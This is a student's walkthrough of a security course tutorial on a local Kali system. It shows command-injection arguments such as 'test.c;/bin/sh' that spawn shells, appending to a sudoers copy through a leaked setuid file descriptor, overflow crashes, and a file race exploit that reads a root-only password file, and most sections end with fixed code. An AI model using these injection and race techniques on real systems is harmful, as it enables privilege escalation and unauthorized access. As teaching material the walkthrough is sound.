@@ -1,0 +1,859 @@
+
+Walkthrough for Tutorial 01
+
+
+1.1
+
+This is pretty simple to start with, just follow the tutorial.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ gcc -o test test.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ ./test "test.c;/bin/sh"
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+int main(int argc, char *argv[])
+  {char *cat ="/bin/cat";
+  char *command = malloc(strlen(cat) + strlen(argv[1]) +2);
+  sprintf(command, "%s %s", cat, argv[1]);
+  system(command);
+  return 0;}
+
+$ whoami
+admin
+$ exit
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ 
+
+
+The program works like cat and I can spawn a shell.
+
+Now let's do the same with sudo.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ sudo ./test "test.c;/bin/sh"
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+int main(int argc, char *argv[])
+  {char *cat ="/bin/cat";
+  char *command = malloc(strlen(cat) + strlen(argv[1]) +2);
+  sprintf(command, "%s %s", cat, argv[1]);
+  system(command);
+  return 0;}
+
+# whoami
+root
+# exit
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ 
+
+
+Looks like this works. Let's quickly look at how it can go wrong if I don't use the right quotation marks for my string:
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ sudo ./test test.c;/bin/sh
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+int main(int argc, char *argv[])
+  {char *cat ="/bin/cat";
+  char *command = malloc(strlen(cat) + strlen(argv[1]) +2);
+  sprintf(command, "%s %s", cat, argv[1]);
+  system(command);
+  return 0;}
+
+$ whoami
+admin
+$ echo Ooops!
+Ooops!
+$ exit
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ 
+
+
+Let's go back to following the xcript.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ cp test retest 
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ sudo chown root:root retest 
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ sudo chmod 4755 retest 
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ ls -al
+total 44
+drwxr-xr-x 2 admin admin  4096 Mar 31 14:50 .
+drwxr-x--- 9 admin admin  4096 Feb 10 09:45 ..
+-rwsr-xr-x 1 root  root  15608 Mar 31 14:50 retest
+-rwxr-xr-x 1 admin admin 15608 Mar 31 14:48 test
+-rwxr-x--- 1 admin admin   255 Jan 20 04:49 test.c
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ 
+
+
+We've created a version "retest" owner by root with SETUID flag set. Let's see what happens when we inject our command now.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ ./retest test.c
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+int main(int argc, char *argv[])
+  {char *cat ="/bin/cat";
+  char *command = malloc(strlen(cat) + strlen(argv[1]) +2);
+  sprintf(command, "%s %s", cat, argv[1]);
+  system(command);
+  return 0;}
+
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ ./retest "test.c;/bin/sh"
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+int main(int argc, char *argv[])
+  {char *cat ="/bin/cat";
+  char *command = malloc(strlen(cat) + strlen(argv[1]) +2);
+  sprintf(command, "%s %s", cat, argv[1]);
+  system(command);
+  return 0;}
+
+$ whoami
+admin
+$ echo "Sad face :( "
+Sad face :( 
+$ exit
+admin@kali:~/SecurityClass/Tutorial-01/1.1$ 
+
+
+Well, no root privileges, but at least it does what the tutorial says it should.
+
+
+1.2
+
+Let's start with the script.
+
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ gcc -o spam spam.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ ./spam 5 SPAM
+SPAM
+SPAM
+SPAM
+SPAM
+SPAM
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ cat spam.c 
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+int main(int argc, char *argv[]) {
+  if (argc < 3) { printf("Insufficient arguments\n");return 1; }
+  char *echo ="/bin/echo";
+  char *command = malloc(strlen(echo) + strlen(argv[2]) +2);
+  sprintf(command, "%s %s", echo, argv[2]);
+  unsigned char i = 0;
+  int limit = atoi(argv[1]);
+  while (i < limit) {
+    system(command);
+    i++;
+  }
+  free(command);
+  return 0;
+}
+
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ 
+
+
+Looks like I could do the same kind of string injection, let's try with less spam though:
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ ./spam 2 "Opps;/bin/sh"
+Opps
+$ echo "Hacked!"
+Hacked!
+$ exit
+Opps
+$ echo "Glad I only did spam a few times."
+Glad I only did spam a few times.
+$ exit
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ 
+
+
+I added an extra command to do something I wanted, of course since I ran for 2 iterations I ran bash twice. Also if I had made a mistake I would not have created a new shell each time, let's look at a mistake:
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ ./spam 2 Opps;/bin/sh
+Opps
+Opps
+$ echo I'm in a shall, but at the end, not from the spam program.
+> ' 
+Im in a shall, but at the end, not from the spam program.
+
+$ exit
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ 
+
+
+Notice the extra bash was only run once due to the missing quotation marks.
+
+Let's look at delay.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ gcc -o delay delay.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ cat delay.c 
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+int main(int argc, char *argv[]) {
+  if (argc != 2) { printf("Usage: \"%s n\" to delay for n seconds\n",argv[0]); return 1;}
+  char *sleep ="/bin/sleep";
+  char *command = malloc(strlen(sleep) + strlen(argv[1]) +2);
+  sprintf(command, "%s %s", sleep, argv[1]);
+  system(command);
+  return 0;
+}
+
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ ./delay 2
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ ./delay "2;/bin/sh"
+$ echo Different shell, notice the prompt has changed 
+Different shell, notice the prompt has changed
+$ exit
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ 
+
+
+Nothing surprising there. Let's see how we could quickly fix these two programs. Since they both have mistakes with using commands, let's simply replace that with a safe(r) option.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ cp spam.c new-spam.c
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ vim new-spam.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ cat new-spam.c 
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+int main(int argc, char *argv[]) {
+  if (argc < 3) { printf("Insufficient arguments\n");return 1; }
+  unsigned char i = 0;
+  int limit = atoi(argv[1]);
+  while (i < limit) {
+    printf("%s\n",argv[2]);
+    i++;
+  }
+  return 0;
+}
+
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ gcc -o new-spam new-spam.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ ./new-spam 5 SPAM
+SPAM
+SPAM
+SPAM
+SPAM
+SPAM
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ ./new-spam 2 "Opps;/bin/sh"
+Opps;/bin/sh
+Opps;/bin/sh
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ 
+
+
+Looks like that's fixed the spam program by safely wrapping the string. Now let's do the delay program.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ cp delay.c new-delay.c
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ vim new-delay.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ gcc -o new-delay new-delay.c 
+new-delay.c: In function ‘main’:
+new-delay.c:7:3: warning: implicit declaration of function ‘sleep’ [-Wimplicit-function-declaration]
+    7 |   sleep(atoi(argv[1]));
+      |   ^~~~~
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ ./new-delay 2
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ ./new-delay "2;/bin/sh"
+admin@kali:~/SecurityClass/Tutorial-01/1.2$ 
+
+
+I was lazy and didn't fix the implicit use of the sleep function in C, but this still works (although you can't see the delay from the text here). Also (as a coincidence) the "atoi" function ignores the rest of the string for me.
+
+
+1.3
+
+Let's follow the script.
+
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ gcc -o fedit fedit.c
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ sudo cp fedit rootedit
+admin@kali:~/SecurityClass/Tutorial-01/1.3$   sudo chown root:root rootedit
+admin@kali:~/SecurityClass/Tutorial-01/1.3$   sudo chmod 4755 rootedit
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ ls -lsa
+total 44
+ 4 drwxr-xr-x 2 admin admin  4096 Mar 31 15:11 .
+ 4 drwxr-x--- 9 admin admin  4096 Feb 10 09:45 ..
+16 -rwxr-xr-x 1 admin admin 15680 Mar 31 15:09 fedit
+ 4 -rwxr-x--- 1 admin admin   466 Jan 20 05:34 fedit.c
+16 -rwsr-xr-x 1 root  root  15680 Mar 31 15:11 rootedit
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ sudo cp /etc/sudoers .
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ ls -lsa
+total 48
+ 4 drwxr-xr-x 2 admin admin  4096 Mar 31 15:12 .
+ 4 drwxr-x--- 9 admin admin  4096 Feb 10 09:45 ..
+16 -rwxr-xr-x 1 admin admin 15680 Mar 31 15:09 fedit
+ 4 -rwxr-x--- 1 admin admin   466 Jan 20 05:34 fedit.c
+16 -rwsr-xr-x 1 root  root  15680 Mar 31 15:11 rootedit
+ 4 -r--r----- 1 root  root    703 Mar 31 15:12 sudoers
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ touch sudoers 
+touch: cannot touch 'sudoers': Permission denied
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ whoami
+admin
+admin@kali:~/SecurityClass/Tutorial-01/1.3$
+
+
+Ok, I have the files I want and they have the permissions I want. Also I cannot access the sudoers file because I am not root. Since we're going to try and edit it, I'll quickly use sudo to cat the file so I can check later if anything has changed.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ sudo cat sudoers 
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+admin   ALL=(ALL:ALL) NOPASSWD: ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ 
+
+
+Now let's run rootedit and see if we can edit the file.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ ./rootedit sudoers
+fd is 3
+$ touch sudoers
+touch: cannot touch 'sudoers': Permission denied
+$ whoami
+admin
+$ echo "#test" >&3   
+$ exit
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ sudo cat sudoers 
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+admin   ALL=(ALL:ALL) NOPASSWD: ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+#test
+admin@kali:~/SecurityClass/Tutorial-01/1.3$ 
+
+
+We were able to use the file descriptor to edit a file we should not have access to. Nice. 
+
+
+1.4
+
+Start by following the script
+
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ cat sign-overflow.c 
+#include "stdio.h"
+
+int main() {
+  short nb1, nb2, 
+  res = 0; printf("enter first digit : "); 
+  scanf("%hd", &nb1); 
+  printf("enter second digit : "); 
+  scanf("%hd", &nb2);
+
+  res = nb1 + nb2; 
+  printf("%hd + %hd = %hd\n", nb1, nb2, res);
+ 
+  return 0;
+} 
+
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ gcc -o sign-overflow sign-overflow.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./sign-overflow
+enter first digit : 300
+enter second digit : 350
+300 + 350 = 650
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./sign-overflow
+enter first digit : 10000
+enter second digit : 22769
+10000 + 22769 = -32767
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ 
+
+
+Ok, let's fix this.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ cp sign-overflow.c new-sign-overflow.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ vim new-sign-overflow.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ cat new-sign-overflow.c 
+#include "stdio.h"
+
+int main() {
+  short nb1, nb2, 
+  res = 0; printf("enter first digit : "); 
+  scanf("%hd", &nb1); 
+  printf("enter second digit : "); 
+  scanf("%hd", &nb2);
+
+  res = nb1 + nb2;
+  if ((nb1 < 0 && nb2 < 0 && res > 0) ||
+      (nb1 > 0 && nb2 > 0 && res < 0)
+     ) {
+    printf("Overflow detected!\n");
+  } else {
+    printf("%hd + %hd = %hd\n", nb1, nb2, res);
+  }
+  return 0;
+} 
+
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ gcc -o new-sign-overflow new-sign-overflow.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./new-sign-overflow
+enter first digit : 10000
+enter second digit : 22769
+Overflow detected!
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./new-sign-overflow
+enter first digit : -10000
+enter second digit : -22769
+Overflow detected!
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./sign-overflow
+enter first digit : -10000
+enter second digit : -22769
+-10000 + -22769 = 32767
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ 
+
+
+Looks like this is solved. Note that here it is not trivial to detect when overflow is happening, but the conditions here are good enough. Note that if we had simply made the sizes bigger (e.g. used int or something like uint64) we would still have had undetected overflow, just not on such small numbers.
+
+
+The spam program can be broken with:
+
+./spam 300 SPAM
+
+but I won't show the output. Instead let's go straight to fixing it.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ cp ../1.2/new-spam.c .
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ vim new-spam.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ gcc -o new-spam new-spam.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ cat new-spam.c 
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+int main(int argc, char *argv[]) {
+  if (argc < 3) { printf("Insufficient arguments\n");return 1; }
+  unsigned char i = 0; //max value 255
+  int limit = atoi(argv[1]);
+  if (limit > 255) {
+    printf("Too much spam!\n");
+    return 1;
+  }
+  while (i < limit) {
+    printf("%s\n",argv[2]);
+    i++;
+  }
+  return 0;
+}
+
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./new-spam 300 SPAM
+Too much spam!
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ 
+
+
+Here I'm taking the lazy fix of assuming that the program is meant to have a limit according to unsigned char size. Of course this may not be right, but it makes the bounds checking easy.
+
+
+Now let's look at the mycat file.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ gcc -o mycat mycat.c
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./mycat mycat.c 
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+int main(int argc, char *argv[]){
+  short s = 100; 
+  int i = 100; 
+  char buf[100];
+  if (argc > 2) {
+    i = atoi(argv[2]); 
+    s = i; 
+    if (s>100){ printf("Buffer size too large\n"); return 1;}
+  }
+  FILE *file;
+  int nread;
+  file = fopen(argv[1],"r");
+  if (file) {
+    while ((nread = fread(buf, 1, i, file)) > 0) {
+      if (nread <= i) { buf[nread] = 0; }
+      printf("%s",buf);
+    }
+    fclose(file);
+  }
+  return 0;
+} 
+
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./mycat shortfile 
+A short file.
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./mycat shortfile 50
+A short file.
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./mycat longfile 65536
+Segmentation fault
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./mycat shortfile -1
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./mycat shortfile -100
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ 
+
+
+I didn't print the longfile output because it would be too long. Clearly there are some problems here.
+
+Let's try to fix this.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ cp mycat.c new-mycat.c
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ vim new-mycat.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ cat new-mycat.c 
+#include "stdlib.h"
+#include "stdio.h"
+#include "string.h"
+
+#define LIMIT 4096
+
+int main(int argc, char *argv[]){
+  int i = LIMIT; 
+  char * buf;
+  if (argc > 2) {
+    i = atoi(argv[2]); 
+    if (i>LIMIT){ printf("Buffer size too large\n"); return 1;}
+    if (i<1){ printf("Buffer size too small\n"); return 2;}
+  }
+  FILE *file;
+  int nread;
+  buf = malloc(i);
+  file = fopen(argv[1],"r");
+  if (file) {
+    while ((nread = fread(buf, 1, i, file)) > 0) {
+      if (nread <= i) { buf[nread] = 0; }
+      printf("%s",buf);
+    }
+    fclose(file);
+  }
+  free(buf);
+  return 0;
+} 
+
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ gcc -o new-mycat new-mycat.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./new-mycat shortfile 4095
+A short file.
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./new-mycat shortfile 4096
+A short file.
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./new-mycat shortfile 4097
+Buffer size too large
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./new-mycat shortfile -1
+Buffer size too small
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ ./new-mycat shortfile 65536
+Buffer size too large
+admin@kali:~/SecurityClass/Tutorial-01/1.4$ 
+
+
+The fixes here are in a couple of places (I've not shown output from testing longfile). I've changed the types for all the input and usage to be the same. I've also refactored to have a single LIMIT value I use by default or update. I now check for negative values as well as being over the limit. I also fix the potential for memory allocation problems, although we probably could have a larger buffer if we wanted. 
+
+Note this code is not perfectly safe, but it's a lot better for the problems we're looking for here. Also this code improves on bettercat.c as well.
+
+
+
+1.5
+
+
+Let's follow the script and see how it goes.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.5$   gcc -o race race.c
+admin@kali:~/SecurityClass/Tutorial-01/1.5$   sudo chown root:root race
+admin@kali:~/SecurityClass/Tutorial-01/1.5$   sudo chmod 4755 race
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ ls
+exploit.c  race  race.c
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ ./race
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ ls -lsa
+total 36
+ 4 drwxr-xr-x 2 admin admin  4096 Apr  1 04:23 .
+ 4 drwxr-x--- 9 admin admin  4096 Feb 10 09:45 ..
+ 4 -rwxr-x--- 1 admin admin   251 Jan 20 07:18 exploit.c
+ 4 -rwx------ 1 root  admin    18 Apr  1 04:23 password.txt
+16 -rwsr-xr-x 1 root  root  15756 Apr  1 04:23 race
+ 4 -rwxr-x--- 1 admin admin   385 Jan 20 07:18 race.c
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ cat password.txt 
+cat: password.txt: Permission denied
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ 
+
+
+Let's start the race side:
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ cat race.c 
+#include "fcntl.h"
+#include "stdio.h"
+#include "sys/stat.h"
+
+/*race.c*/
+
+int main() { 
+  struct stat st; FILE* fd; 
+  
+  if(!stat("password.txt", &st)) { 
+     printf("file already exists\n"); 
+     return 0;
+   } 
+  fd = fopen("password.txt", "a"); 
+  fputs("monsupermotdepasse", fd);
+  fflush(fd);
+  chmod("password.txt", S_IREAD | S_IEXEC | S_IWRITE);
+  fclose(fd); 
+  return 0;
+}
+
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ while true; do ./race; done
+file already exists
+file already exists
+...
+
+
+Note that lots of output has been deleted here (it is still running while I do the next bits)
+
+
+Now let's do the exploit part.
+
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ gcc -o exploit exploit.c                                         
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ cat exploit.c 
+/*exploit.c */
+#include <stdlib.h> 
+#include <stdio.h>
+#include <unistd.h> 
+
+int main(int argc, char* argv[]) {
+  int i = 0; 
+  while(i < atoi(argv[1])) { 
+    remove("password.txt"); 
+    system("/bin/cat password.txt"); 
+    i++;
+  }
+  return 0;
+}
+
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ 
+
+
+Ok, we're ready to run the exploit (keep in mind race is still running in another terminal session).
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ ./exploit 1000 >>result.txt
+/bin/cat: password.txt: Permission denied
+/bin/cat: password.txt: No such file or directory
+...
+/bin/cat: password.txt: Permission denied
+/bin/cat: password.txt: Permission denied
+/bin/cat: password.txt: Permission denied
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ cat result.txt 
+monsupermotdepassemonsupermotdepassemonsupermotdepassemonsupermotdepasseadmin@kali:~/SecurityClass/Tutorial-01/1.5$
+
+
+Note that lots of output is cut above, but we have accessed the password and saved it several times (it's probably "monsupermotdepasse" but it could be repeated some number of times). Let's stop the other session now.
+
+
+file already exists
+file already exists
+^C
+admin@kali:~/SecurityClass/Tutorial-01/1.5$
+
+Again there was lots more output there I hid.
+
+
+Let's edit the race.c as a new version.
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ while true; do ./race; done^C
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ cp race.c new-race.c
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ vim new-race.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ cat new-race.c 
+#include "fcntl.h"
+#include "stdio.h"
+#include "sys/stat.h"
+
+/*race.c*/
+
+int main() { 
+  struct stat st; FILE* fd; 
+  
+  if(!stat("password.txt", &st)) { 
+     printf("file already exists\n"); 
+     return 0;
+   } 
+  fd = fopen("password.txt", "a"); 
+  chmod("password.txt", S_IREAD | S_IEXEC | S_IWRITE);
+  fputs("monsupermotdepasse", fd);
+  fflush(fd);
+  fclose(fd); 
+  return 0;
+}
+
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ sudo rm password.txt 
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ gcc -o new-race new-race.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ sudo chown root:root new-race
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ sudo chmod 4755 new-race
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ rm result.txt 
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ while true; do ./new-race; done
+...
+
+
+In the other session we run:
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ ./exploit 10000 >>result.txt
+...
+admin@kali:~/SecurityClass/Tutorial-01/1.5$ cat result.txt 
+admin@kali:~/SecurityClass/Tutorial-01/1.5$
+
+
+Here I tried with only 1,000 like before without any success, so I ran the above with 10,000 and still had no success. This is (probably) fixed. ;)
+
+
+
+1.6
+
+
+Let's follow the script...
+
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ gcc -pthread -o threadrace threadrace.c
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ ./threadrace 
+done
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ 
+
+
+Now we start different compile level optimisations:
+
+
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ gcc -pthread -O0 -o threadrace threadrace.c
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ ./threadrace 
+done
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ gcc -pthread -O1 -o threadrace threadrace.c
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ while true;do ./threadrace ;done
+set to 0!
+set to 0!
+set to 0!
+set to 0!
+set to 0!
+set to 0!
+set to 0!
+^C
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ gcc -pthread -O2 -o threadrace threadrace.c
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ while true;do ./threadrace ;done
+set to 0!
+set to 0!
+set to 0!
+set to 0!
+set to 0!
+^C
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ gcc -pthread -O3 -o threadrace threadrace.c
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ while true;do ./threadrace ;done
+set to 0!
+set to 0!
+set to 0!
+^C
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ ./threadrace 
+set to 0!
+set to 0!
+set to 0!
+set to 0!
+^C
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ gcc -pthread -Os -o threadrace threadrace.c
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ ./threadrace 
+set to 0!
+set to 0!
+set to 0!
+^C
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ gcc -pthread -Ofast -o threadrace threadrace.c
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ ./threadrace 
+set to 0!
+set to 0!
+^C
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ clang -pthread -o clangrace threadrace.c
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ ./clangrace 
+set to 0!
+^C
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ 
+
+
+Looks like most of them cause a race condition.
+
+Now let's edit line 6.
+
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ cp threadrace.c l6-threadrace.c
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ vim l6-threadrace.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ cat l6-threadrace.c 
+#include <stdio.h>
+#include <pthread.h>
+
+void *f(void *v) {       
+  int *i = (int *) v;        
+  i = 0;        
+  printf("set to 0!\n");        
+  return NULL;
+}
+
+int main() {
+  const int c = 1;       int i = 0;     pthread_t thread;
+  void *ptr =(void *) &c;
+  while(c) {
+    i++;
+    if (i == 1000) {
+      pthread_create(&thread, NULL, &f, ptr);
+    }
+  }
+  printf("done\n");
+}
+
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ gcc -pthread -o l6-threadrace l6-threadrace.c 
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ ./l6-threadrace 
+set to 0!
+^C
+admin@kali:~/SecurityClass/Tutorial-01/1.6$ 
+
+
+When we change the assignment on line 6 to be to the pointer and not the value pointer to then we only update a local variable. Since we never change the value that was initially assignment to "c", the program runs forever.
+
+->> Nice link: https://medium.com/@elniak/gtfobins-and-lolbas-mastering-binary-exploitation-in-ethical-hacking-for-unix-and-windows-30dd86e52370?sk=dd776ac25f9787b9594078188b9c38ea
+
